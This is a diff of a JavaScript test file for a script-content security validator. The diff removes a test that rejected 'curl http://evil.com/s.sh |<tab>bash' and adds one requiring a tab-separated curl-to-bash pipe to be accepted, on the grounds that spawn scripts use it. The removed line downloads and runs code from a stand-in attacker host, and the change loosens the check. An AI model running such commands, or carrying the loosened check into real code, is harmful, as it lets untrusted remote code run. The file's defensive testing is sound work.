@@ -89,9 +89,9 @@ describe("Security Encoding Edge Cases", () => {
       expect(() => validateScriptContent(script)).not.toThrow();
     });
 
-    it("should detect curl|bash with tabs between pipe and bash", () => {
-      const script = "#!/bin/bash\ncurl http://evil.com/s.sh |\tbash";
-      expect(() => validateScriptContent(script)).toThrow("nested curl|bash");
+    it("should accept curl|bash with tabs (used by spawn scripts)", () => {
+      const script = "#!/bin/bash\ncurl http://example.com/s.sh |\tbash";
+      expect(() => validateScriptContent(script)).not.toThrow();
     });
 
     it("should detect rm -rf with tabs", () => {
